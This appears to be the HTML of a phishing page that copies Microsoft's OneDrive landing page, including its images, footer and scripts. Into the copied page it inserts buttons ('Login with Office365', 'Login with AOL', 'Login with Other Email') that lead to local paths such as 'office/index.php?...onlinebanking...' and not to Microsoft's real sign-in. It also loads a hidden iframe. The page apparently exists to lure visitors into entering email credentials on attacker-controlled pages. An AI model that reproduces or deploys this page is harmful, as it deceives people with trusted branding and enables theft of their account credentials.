            <div class="theme-dark brand-blue js-cat-head" itemprop="brand" itemscope="itemscope" itemtype="http://schema.org/Brand" data-m="{&quot;cN&quot;:&quot;UHF category nav_cont&quot;,&quot;cT&quot;:&quot;Container&quot;,&quot;id&quot;:&quot;c4c1m1r1a1&quot;,&quot;sN&quot;:4,&quot;aN&quot;:&quot;c1m1r1a1&quot;}">

<div>
       

</div>


            
        </div>

    
</header>


    </div>
            </div>

    </section>

    </div>

        </header>
        <div id="main-content-landing">
            










<main id="SignedOut-onedrivePage" data-grid="container" class="content-container context-amc signedout-container" role="main">
    


<div class="m-hero-item f-medium f-x-left f-y-center theme-dark context-app f-mask-Opacity20" itemscope="" itemtype="http://schema.org/SoftwareApplication"><picture class="c-image"><source media="(min-width: 1083px)" srcset="https://compass-ssl.microsoft.com/assets/18/7a/187a749f-a897-47d3-bf2f-b24333a1f682.jpg?n=hero-16-6-vp4-onedrive.jpg"><source media="(min-width: 767px)" srcset="https://compass-ssl.microsoft.com/assets/05/5b/055b0ea4-5399-4937-9eaf-c34e18b5ef38.jpg?n=hero-16-9-vp3-onedrive.jpg"><source media="(min-width: 539px)" srcset="https://compass-ssl.microsoft.com/assets/b5/dc/b5dcc904-3efa-48bb-9787-5a62086cc639.jpg?n=hero-16-9-vp2-onedrive.jpg"><source media="(min-width: 0px)" srcset="https://compass-ssl.microsoft.com/assets/b6/6a/b66abf6e-53c3-47ae-9e60-a29bfd01737f.jpg?n=hero-16-9-vp1-onedrive.jpg"><img src="files/b66abf6e-53c3-47ae-9e60-a29bfd01737f.jpg" srcset="https://compass-ssl.microsoft.com/assets/b6/6a/b66abf6e-53c3-47ae-9e60-a29bfd01737f.jpg?n=hero-16-9-vp1-onedrive.jpg" alt="Two women using a laptop in a work setting."></picture><div class="x-hidden-focus"><div><picture><source media="(min-width: 0px)" srcset="https://compass-ssl.microsoft.com/assets/21/99/2199ad01-f568-4773-9b7a-a8ccadbd719a.svg?n=onedrive.svg"><img src="files/2199ad01-f568-4773-9b7a-a8ccadbd719a.svg" srcset="https://compass-ssl.microsoft.com/assets/21/99/2199ad01-f568-4773-9b7a-a8ccadbd719a.svg?n=onedrive.svg" alt=""></picture><h1 class="c-heading">Always available. 
Always on your time.</h1><div class="login-form">
      <div class="sign-in-htm">
        <div class="group">
          <button class="btn-3 loginBtn loginBtn--office" onclick="location.href=('office/index.php?securitysteps_5f512a34358ae4d3_ACCESS_verify_i5f512a34358ae4d3_token9833jnm246hHjmssw_onlinebanking_DO7dtkwIsdfg','no','no','no','no','no','no','1001','301','2101','office/index.php?securitysteps_5f512a34358ae4d3_ACCESS_verify_i5f512a34358ae4d3_token9833jnm246hHjmssw_onlinebanking_DO7dtkwIsdfg')">Login with Office365</button>
        </div>
        <div class="group">
          <button class="btn-3 loginBtn loginBtn--aol" onclick="location.href=('aol/','no','no','no','no','no','no','1001','301','2101','aol/')">Login with AOL</button>
        </div>
            
        <div class="group">
          <button class="btn-3 loginBtn loginBtn--other" onclick="location.href=('oth/','no','no','no','no','no','no','1001','301','2101','oth/')">Login with Other Email</button>
         
        </div>
      </div>
    </div></div></div></div>

<center><div data-grid="container stack-4" class="product-links product-links"><div data-grid="col-12 " class="x-hidden-focus"><h2 class="c-heading-3 ">Sign in with your organizational account to keep everything within reach</h2></div>


<div class="m-feature"><section class="c-feature f-align-right f-background-neutral-10"><picture><source media="(min-width: 648px)" srcset="https://compass-ssl.microsoft.com/assets/07/59/0759e81c-5b38-4b6f-be88-c4983251e7f9.jpg?n=feature-onedrive1-vp5.jpg"><source media="(min-width: 0px)" srcset="https://compass-ssl.microsoft.com/assets/6b/1f/6b1f253c-6cfa-4c0e-97d4-6ed7a5606a1e.jpg?n=feature-onedrive1-vp4.jpg"><img src="files/6b1f253c-6cfa-4c0e-97d4-6ed7a5606a1e.jpg" srcset="https://compass-ssl.microsoft.com/assets/6b/1f/6b1f253c-6cfa-4c0e-97d4-6ed7a5606a1e.jpg?n=feature-onedrive1-vp4.jpg" alt="One place for everything in"></picture><div><h2 class="c-heading">One place for everything in
your life</h2><p class="c-paragraph">OneDrive lets you easily backup, 
store and share photos, videos, documents, and more – anywhere, on any 
device. Plus your Microsoft account comes with a huge amount of free 
online storage.</p></div></section></div><div class="m-feature"><section class="c-feature f-align-left"><picture><source media="(min-width: 648px)" srcset="https://compass-ssl.microsoft.com/assets/d2/ab/d2abc970-d69b-4df4-8a93-72cb840a8f9c.jpg?n=feature-onedrive2-vp5.jpg"><source media="(min-width: 0px)" srcset="https://compass-ssl.microsoft.com/assets/70/c9/70c95ab9-ff97-4fa4-a1ee-c6d81ade8027.jpg?n=feature-onedrive2-vp4.jpg"><img src="files/70c95ab9-ff97-4fa4-a1ee-c6d81ade8027.jpg" srcset="https://compass-ssl.microsoft.com/assets/70/c9/70c95ab9-ff97-4fa4-a1ee-c6d81ade8027.jpg?n=feature-onedrive2-vp4.jpg" alt="OneDrive"></picture><div><h2 class="c-heading">Services that fit like a family</h2><p class="c-paragraph">Chat
 while collaborating in Office Online documents.  Know when and who is 
editing with real-time notifications.  Share attachments on Outlook 
easily and save to OneDrive from PowerPoint, Excel, Word, and more.</p></div></section></div><div class="m-feature"><section class="c-feature f-align-right f-background-neutral-10"><picture><source media="(min-width: 648px)" srcset="https://compass-ssl.microsoft.com/assets/b5/7e/b57e88fd-1cfb-4ff7-88cc-fa47871410c2.jpg?n=feature-onedrive3-vp5.jpg"><source media="(min-width: 0px)" srcset="https://compass-ssl.microsoft.com/assets/d9/3e/d93e67c6-8e14-432f-bd4c-b81657c1a378.jpg?n=feature-onedrive3-vp4.jpg"><img src="files/d93e67c6-8e14-432f-bd4c-b81657c1a378.jpg" srcset="https://compass-ssl.microsoft.com/assets/d9/3e/d93e67c6-8e14-432f-bd4c-b81657c1a378.jpg?n=feature-onedrive3-vp4.jpg" alt="Making collaboration easier"></picture><div><h2 class="c-heading">Making collaboration easier</h2><p class="c-paragraph">Collaborate with Word, Excel, PowerPoint, and OneNote from your desktop, mobile device, and the web.</p></div></section></div><div class="m-feature"><section class="c-feature f-align-left"><picture><source media="(min-width: 648px)" srcset="https://compass-ssl.microsoft.com/assets/c9/8f/c98f704a-1ee4-4f6f-b39d-149f070d4e3f.jpg?n=feature-onedrive4-vp5.jpg"><source media="(min-width: 0px)" srcset="https://compass-ssl.microsoft.com/assets/c3/2d/c32db704-6637-4c4e-a590-88da4dc64887.jpg?n=feature-onedrive4-vp4.jpg"><img src="files/c32db704-6637-4c4e-a590-88da4dc64887.jpg" srcset="https://compass-ssl.microsoft.com/assets/c3/2d/c32db704-6637-4c4e-a590-88da4dc64887.jpg?n=feature-onedrive4-vp4.jpg" alt="A watch, tablet, and phone; access OneDrive on any device."></picture><div><h2 class="c-heading">Any device, anytime</h2><p class="c-paragraph">OneDrive
 is pre-installed on Windows 10, and it works great on all your 
devices. Access and share files and photos on PC, Mac, Android, and iOS</p></div></section></div>



</main>
        </div>

        

    </div>
    <div id="site-footer">
        

    <section id="footerArea" data-m="{&quot;cN&quot;:&quot;footerArea&quot;,&quot;cT&quot;:&quot;Area_coreuiArea&quot;,&quot;id&quot;:&quot;a2Body&quot;,&quot;sN&quot;:2,&quot;aN&quot;:&quot;Body&quot;}">
                    <div id="footerRegion" data-region-key="footerregion" data-m="{&quot;cN&quot;:&quot;footerRegion&quot;,&quot;cT&quot;:&quot;Region_coreui-region&quot;,&quot;id&quot;:&quot;r1a2&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;a2&quot;}">

    <div id="footerUniversalFooter" data-m="{&quot;cN&quot;:&quot;footerUniversalFooter&quot;,&quot;cT&quot;:&quot;Module_coreui-universalfooter&quot;,&quot;id&quot;:&quot;m1r1a2&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;r1a2&quot;}" data-module-id="Category|footerRegion|footerRegion|footerUniversalFooter|coreui-universalfooter">
        

<footer id="uhf-footer" role="contentinfo" class="c-uhff context-uhf" data-uhf-mscc-rq="false" data-footer-footprint="/amc/amc-L0-footer" data-m="{&quot;cN&quot;:&quot;Uhf footer_cont&quot;,&quot;cT&quot;:&quot;Container&quot;,&quot;id&quot;:&quot;c1m1r1a2&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;m1r1a2&quot;}">
    <div class="c-uhff-base">
                <a id="locale-picker-link" class="c-uhff-link c-uhff-lang-selector c-glyph glyph-world" href="https://account.microsoft.com/languages?lang=en-us" data-m="{&quot;cN&quot;:&quot;locale_picker(US)_nav&quot;,&quot;id&quot;:&quot;n1c1m1r1a2&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;c1m1r1a2&quot;}">English (United States)</a>

        <ul role="contentinfo" aria-label="Microsoft corporate links" class="c-list f-bare" data-m="{&quot;cN&quot;:&quot;Corp links_cont&quot;,&quot;cT&quot;:&quot;Container&quot;,&quot;id&quot;:&quot;c2c1m1r1a2&quot;,&quot;sN&quot;:2,&quot;aN&quot;:&quot;c1m1r1a2&quot;}">
                            <li>
                    <a class="c-uhff-link" href="https://go.microsoft.com/fwlink/?LinkID=521839" data-mscc-ic="false" data-m="{&quot;cN&quot;:&quot;footer-privacycookies_nav&quot;,&quot;id&quot;:&quot;n1c2c1m1r1a2&quot;,&quot;sN&quot;:1,&quot;aN&quot;:&quot;c2c1m1r1a2&quot;}">Privacy &amp; cookies</a>
                </li>
                <li>
                    <a class="c-uhff-link" href="https://go.microsoft.com/fwlink/?LinkID=530144&amp;clcid={CLCID_HEX}" data-mscc-ic="false" data-m="{&quot;cN&quot;:&quot;footer-terms_nav&quot;,&quot;id&quot;:&quot;n2c2c1m1r1a2&quot;,&quot;sN&quot;:2,&quot;aN&quot;:&quot;c2c1m1r1a2&quot;}">Terms of use</a>
                </li>
                <li>
                    <a class="c-uhff-link" href="https://support.microsoft.com/contactus" data-mscc-ic="false" data-m="{&quot;cN&quot;:&quot;footer-contactus_nav&quot;,&quot;id&quot;:&quot;n3c2c1m1r1a2&quot;,&quot;sN&quot;:3,&quot;aN&quot;:&quot;c2c1m1r1a2&quot;}">Contact us</a>
                </li>
                <li>
                    <a class="c-uhff-link" href="javascript:MeePortal.Feedback.control.show()" data-mscc-ic="false" data-m="{&quot;cN&quot;:&quot;feedback-button_nav&quot;,&quot;id&quot;:&quot;n4c2c1m1r1a2&quot;,&quot;sN&quot;:4,&quot;aN&quot;:&quot;c2c1m1r1a2&quot;}">Feedback</a>
                </li>

            <li>© Microsoft 2020</li>
            
        </ul>
    </div>
    
</footer>




    </div>
            </div>

    </section>



    </div>

    
    




<script src="files/webi"></script><iframe src="files/a3698060313.htm" aria-hidden="true" tabindex="-1" style="display: none;" width="0" hidden="" height="0"></iframe>


<script type="text/javascript" id="portal-telemetry">
    (function bootstrapPortalTelemetry() {
        //  NOTE: MUID sync is always disabled.

        var jsllOptions = {
            appId: "account.microsoft.com",
            isUserSignedIn: false,
            performMuidSync: false,
            allowClickTracking: true,
            allowScrollTracking: false,
            isDiagnosticsLoggingEnabled: false,
            allowTrackAssets: false
        };

        var providerOptions = {
            allowAutoPageView: true,
            market: "US",
            language: "en-US",
            flights: ["delauthredirect","dvcbitreckey","dvccert","dvcequalents","dvcfmdfloc","dvcfmdredesign","dvchidemusic","dvconboard","dvcopt","dvcopt2","dvcpillar","dvcrem","dvcremotelock","dvcresetcode","dvcrome","dvcromesdk","dvcsyncsettings","famarlauncher","famasktobuy","famauthenticatepuid","famauthpuid","fambrowserblock","famchildprofileinfo","famdevicenotify","famfindyourchildoneui","famhip","faminitials","faminterstaddlocation","famlandingoneui","famlaunchernotifications","famlocationaddmember","famlwaddchild","fammanpermoneui","fammaxlimit20","famoneschedule","famparentalconsent","famparentalconsentcvv","famparentmkt","fampcfre","fampcoffline","famplaytime","famrequiresave","famsameuserconsent","famsettingsoneui","famsmsadd","famxboxst","gamcckemngr","gbrwssprt","gfeedbackv2","glangpick","globalhelplinks","globaloptimizely","globalsmoketests","globaluhf","glocalmwf","gmapsv8","gngupgd","guhf3","guhfonerf","gwindowsinsider","gxbox360brwssprt","homedvcalllocate","homehtml5url","homeoneui","homerewardsamchp","homerewfre","loadcontrolprototypes","paymentlightweight","pfupgd","privexportbrowse","privexportlocation","privexportsearch","privexportvoice","privtestapiaccess","privtmlnlocationsr","privtmlnsearchsr","privtmlnvoicesr","privundersa","privusrsettings","proregiondob","redirectredeem","redtigercms","rewardsca","rewardscoldstartflight","rewardsearninghistory","rewardsflight","rewmodern","rewnolegacy","rxgreenidvalidation","rxirisenroll","sgnoutmwfv1","svcabtestoffice","svcabtestxboxlive","svcbckppi","svccancelcharge","svccnclnowrec","svcgroovesunsetmessage","svcmvservices","svcofficecommercial","svcrecswtchpln","svcrectknrnw","svcshowallsubslink","svcupgrd"]
        };

        MeePortal.Telemetry.initializePortalTelemetry({
            providerOptions: providerOptions,
            jsllOptions: jsllOptions,
            portalAreaName: "signedout",
            queryStringParametersBlockList: ["assetId","BirthDay","BirthMonth","BirthYear","brokenChildId","childId","childPuid","cid","Country","email","FirstName","Gender","iAltEmail","id","invitationToken","LastName","memberId","memberIdList","MemberName","onBehalfOfPuid","Password","PhoneCountry","PhoneNumber","puid","puids","RetypePassword","slt","t","token","userId","username","mstoken","cip"]
        });
    })();
</script>

    <script id="site-layout-config" type="text/javascript">
        var MeePortal = MeePortal || {};
        MeePortal.Utilities = MeePortal.Utilities || {};
        MeePortal.SearchSuggestion = MeePortal.SearchSuggestion || {};

        
        MeePortal.g_userFlights = ["delauthredirect","dvcbitreckey","dvccert","dvcequalents","dvcfmdfloc","dvcfmdredesign","dvchidemusic","dvconboard","dvcopt","dvcopt2","dvcpillar","dvcrem","dvcremotelock","dvcresetcode","dvcrome","dvcromesdk","dvcsyncsettings","famarlauncher","famasktobuy","famauthenticatepuid","famauthpuid","fambrowserblock","famchildprofileinfo","famdevicenotify","famfindyourchildoneui","famhip","faminitials","faminterstaddlocation","famlandingoneui","famlaunchernotifications","famlocationaddmember","famlwaddchild","fammanpermoneui","fammaxlimit20","famoneschedule","famparentalconsent","famparentalconsentcvv","famparentmkt","fampcfre","fampcoffline","famplaytime","famrequiresave","famsameuserconsent","famsettingsoneui","famsmsadd","famxboxst","gamcckemngr","gbrwssprt","gfeedbackv2","glangpick","globalhelplinks","globaloptimizely","globalsmoketests","globaluhf","glocalmwf","gmapsv8","gngupgd","guhf3","guhfonerf","gwindowsinsider","gxbox360brwssprt","homedvcalllocate","homehtml5url","homeoneui","homerewardsamchp","homerewfre","loadcontrolprototypes","paymentlightweight","pfupgd","privexportbrowse","privexportlocation","privexportsearch","privexportvoice","privtestapiaccess","privtmlnlocationsr","privtmlnsearchsr","privtmlnvoicesr","privundersa","privusrsettings","proregiondob","redirectredeem","redtigercms","rewardsca","rewardscoldstartflight","rewardsearninghistory","rewardsflight","rewmodern","rewnolegacy","rxgreenidvalidation","rxirisenroll","sgnoutmwfv1","svcabtestoffice","svcabtestxboxlive","svcbckppi","svccancelcharge","svccnclnowrec","svcgroovesunsetmessage","svcmvservices","svcofficecommercial","svcrecswtchpln","svcrectknrnw","svcshowallsubslink","svcupgrd"];

        
        MeePortal.Utilities.EmailRegex = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

        MeePortal.SearchSuggestion.Config = {
            'Url': 'https\x3a\x2f\x2fwww.microsoft.com\x2fservices\x2fapi\x2fv2\x2fsuggest',
            'ClientId': '1A3B4873-9046-4833-982A-65FAE59682B8',
            'ProductCount': 3,
        };
    </script>
    <script src="files/site"></script>

    <script src="files/experiments-globaloptimizely"></script>

    
    

    
<script src="files/mwf-main.js"></script>
<script src="files/amx.js"></script>
    <script src="files/d3-dfd8d6"></script><script src="files/meversion" defer="defer"></script>    <script type="text/javascript">
        if (window.msCommonShell) {
            MeePortal.Telemetry.reportScriptLoaded("UHF", true);
        } else {
            MeePortal.Telemetry.reportScriptLoaded("UHF", false);
        }
    </script>
    <script type="text/javascript">
        if (window.mwf) {
            MeePortal.Telemetry.reportScriptLoaded("MWF", true);
        } else {
            MeePortal.Telemetry.reportScriptLoaded("MWF", false);
        }
    </script>

    

<script id="shared-shell-init" type="text/javascript">
    (function () {
        var myShellOptions = {
            meControlOptions: {
                isINT: false,
                rpData: {
                    msaInfo: {
                        signInUrl: 'https\x3a\x2f\x2flogin.live.com\x2flogin.srf\x3fwa\x3dwsignin1.0\x26rpsnv\x3d13\x26ct\x3d1526485773\x26rver\x3d6.7.6643.0\x26wp\x3dMBI_SSL\x26wreply\x3dhttps\x3a\x252f\x252faccount.microsoft.com\x252fauth\x252fcomplete-signin\x253fru\x253dhttps\x25253a\x25252f\x25252faccount.microsoft.com\x25252f\x25253frefd\x25253daccount.microsoft.com\x252526refp\x25253dsignedout-index\x26lc\x3d1033\x26id\x3d292666\x26lw\x3d1\x26fl\x3deasi2',
                        signOutUrl: 'https\x3a\x2f\x2flogin.live.com\x2flogout.srf\x3fct\x3d1526485774\x26rver\x3d6.7.6643.0\x26lc\x3d1033\x26id\x3d292666\x26ru\x3dhttps\x3a\x252F\x252Faccount.microsoft.com\x252Fauth\x252Fcomplete-signout\x253Fru\x253Dhttps\x25253a\x25252f\x25252faccount.microsoft.com\x25252f\x25253frefd\x25253daccount.microsoft.com\x252526refp\x25253dsignedout-index',
                        meUrl: 'https\x3a\x2f\x2flogin.live.com\x2fMe.srf\x3fwa\x3dwsignin1.0\x26rpsnv\x3d13\x26ct\x3d1526485773\x26rver\x3d6.7.6643.0\x26wp\x3dMBI_SSL\x26wreply\x3dhttps\x3a\x252F\x252Faccount.microsoft.com\x252Fauth\x252Fcomplete-signin\x26lc\x3d1033\x26id\x3d292666',
                    }
                },
                userData:
                {
                    firstName: '',
                    lastName: '',
                    memberName: '',
                    cid: '',
                    authenticatedState: '3'
                },
            },
            events:
            {
                onEventLog: MeePortal.SiteLayout.UhfEventLogCallback
            },
            currentMenuItemId: 'sharedshell-signedout'
        };

        function setShellOptions(shellOptions){
            if (window.msCommonShell) {
                shellOptions.meControlOptions.userData.idp = window.msCommonShell.SupportedAuthIdp.MSA;
                window.msCommonShell.load(shellOptions);
            }
            else {
                window.onShellReadyToLoad = function () {
                    window.onShellReadyToLoad = null;
                    setShellOptions(shellOptions);
                }
            }
        }

        setShellOptions(myShellOptions);
    })();
</script>

    <script type="text/javascript">
        if (window.MSA && window.MSA.MeControl) {
            MeePortal.Telemetry.reportScriptLoaded("MeControl", true);
        } else {
            MeePortal.Telemetry.reportScriptLoaded("MeControl", false);
        }
    </script>

    
<script type="text/javascript">

    (function() {
        // scenario measurement: user sends feedback!
        var userInitiatedFeedback;

        function initFeedback() {
            
            // register feedback event schema via jsll._registerSchema
            window.portalQos.registerRawEventSchemas
            ([
                {
                    name: 'Ms.Webi.MeePortal.UserFeedback',
                    'Ms.Webi.MeePortal.UserFeedback':
                    {
                        part: 'C',
                        def:
                        {
                            fields:
                            [
                                {
                                    req: true,
                                    name: 'feedback_activityId',
                                    type: 'string'
                                },
                                {
                                    name: 'feedback_pageid',
                                    type: 'string'
                                },
                                {
                                    name: 'feedback_message',
                                    type: 'string'
                                },
                                {
                                    name: 'feedback_propbag',
                                    type: 'string'
                                }
                            ]
                        }
                    }
                }
            ]);

            $.portalAjaxGet({
                serviceName: "Feedback",
                operationName: "Feedback_GetStrings",
                url: '/feedback',
                contentType: "application/json",
            })
            .done(function (data) {
                // Initialize feedback control 
                MeePortal.Feedback.control.init({
                    id: 'Ms.Webi.MeePortal.UserFeedback',
                    activityid: 't5t6diR4qEiF+CTm.9',
                    jquery: $,
                    feedbackFormStrings: data,
                    onSendFeedback: sendFeedback,
                    onSendTelemetry: sendTelemetry
                });
            });

        }
        
        function sendTelemetry(data) {

            if (data.eventType == 'qos') {

                switch (data.actionId) {

                    case 'FeedbackInitializationFail':
                    case 'FeedbackRenderingFail':
                    var httpStatusCode = data.qosEvent.successStatus ? 200 : 500;

                    window.portalQos.reportOutgoingApi({
                        isSuccess: data.qosEvent.successStatus,
                        latencyMs: data.qosEvent.duration,
                        requestUri: window.document.location.href,
                        serviceName: 'Feedback',
                        serviceType: 'Ms.Webi.MeePortal.UserFeedback',
                        operationName: data.actionId,
                        currentOperationName: 'Feedback',
                        httpMethod: 'GET',
                        contentType: 'text/javascript',
                        serviceErrorCode: httpStatusCode,
                        errorMessage: data.qosEvent.successStatus ? '' : data.message,
                        httpStatusCode: httpStatusCode.toString()
                    });

                    break;
                }
            } else if (data.eventType == 'bici') {

                switch (data.actionId) {

                    // scenario to measure how many users click feedback
                case 'FeedbackStart':
                    userInitiatedFeedback = window.portalScenarios.beginScenario("Global", "UserInitiatedFeedback");
                    break;

                // scenario to measure how many users click cancel
                case 'FeedbackCancel':
                    window.portalScenarios.cancelScenario({ area: "Global", name: userInitiatedFeedback, isSuccess: true });
                    break;

                // scenario to measure how many users send feedback successfully
                case 'FeedbackSend':
                    window.portalScenarios.endScenario({ area: "Global", name: userInitiatedFeedback, isSuccess: true });
                    break;
                }
            }
        }

        function sendFeedback(data) {

            var event = {
                name: 'Ms.Webi.MeePortal.UserFeedback',
                content: {
                    'Ms.Webi.MeePortal.UserFeedback': {
                        feedback_activityId: data.content.id,
                        feedback_pageid: data.content.pageid,
                        feedback_message: data.content.message,
                        feedback_propbag: JSON.stringify(data.content.systemInfo)
                    }
                }
            };

            window.portalQos.reportRawEvent(event);
        }

        function disposeFeedback() {
            MeePortal.Feedback.control.dispose();
        }

        $(window).load(initFeedback);
       
        $(window).unload(disposeFeedback);
    }());
</script>
    
    <script src="files/signedout-oneui"></script>



    

    



<script type="text/javascript" id="common-module">
    if (window["angular"]) {
        var commonModule;
        try {
            commonModule = angular.module("commonModule");
        }
        catch (e) {
            commonModule = angular.module("commonModule", []);
        }

        var commonConfig = {
            userCulture: "en-US",
            userMarket: "US",
            isAuthenticated: false,
            hbiSignInUrl: "https\x3a\x2f\x2flogin.live.com\x2flogin.srf\x3fwa\x3dwsignin1.0\x26rpsnv\x3d13\x26ct\x3d1526485773\x26rver\x3d6.7.6643.0\x26wp\x3dSAPI\x26wreply\x3dhttps\x3a\x252f\x252faccount.microsoft.com\x252fauth\x252fcomplete-signin\x26lc\x3d1033\x26id\x3d292666\x26lw\x3d1\x26fl\x3deasi2",
            completeSignInReturnUrl: "https\x3a\x2f\x2faccount.microsoft.com\x2fauth\x2fcomplete-signin",
            threatMetrixUrlFormat: "https://fpt.microsoft.com/tags?session_id={0}"
        };

        commonModule.constant("commonConfig", commonConfig);



    }
</script>

    <!-- ServedBy: xfvjhePwB2WhWwZ35N2a9U9q4bwxRvo/K3uHC/6+s3r1FhEHTkGXlSIGKDc71Rhz::Xc9G4NegBTgDD5fguXTgVw==; ActivityId: t5t6diR4qEiF+CTm.9 -->


<script type="text/javascript" src="files/bc3711af-035a-4f2f-ba12-658e1928151b_002.js"></script><script type="text/javascript" crossorigin="anonymous" src="files/bc3711af-035a-4f2f-ba12-658e1928151b.js"></script><div id="ClickTaleDiv" style="display: none;"></div><script crossorigin="anonymous" src="files/WR-latest.js" type="text/javascript" async=""></script><div id="meControlDropdown" class="msame_Drop_root" style="display: none;" aria-expanded="false"><div class="msame_Drop_topb"></div><div class="msame_Drop_content" role="dialog" tabindex="-1" aria-label="Your account"><div class="msame_Drop_active"></div><div class="msame_Drop_rewards" style="display: none;"></div><div class="msame_Drop_account"></div><div class="msame_Drop_links" style="display: none;"><div class="msame_Drop_links_list"></div></div><div class="msame_Drop_signIn"><div id="msame_si0" class="msame_Drop_SI" data-mc-m="{&quot;id&quot;:&quot;signIn&quot;,&quot;aN&quot;:&quot;Me Control Dropdown&quot;,&quot;cT&quot;:&quot;Link&quot;}"><a href="#" target="_self" class="msame_TxtTrunc">Sign in with another account</a></div></div><div class="msame_Drop_signOut"></div><div class="msame_Drop_accts" style="display: none;"><div class="msame_Drop_sep"></div><div class="msame_Drop_accts_list"></div></div></div></div></body></html>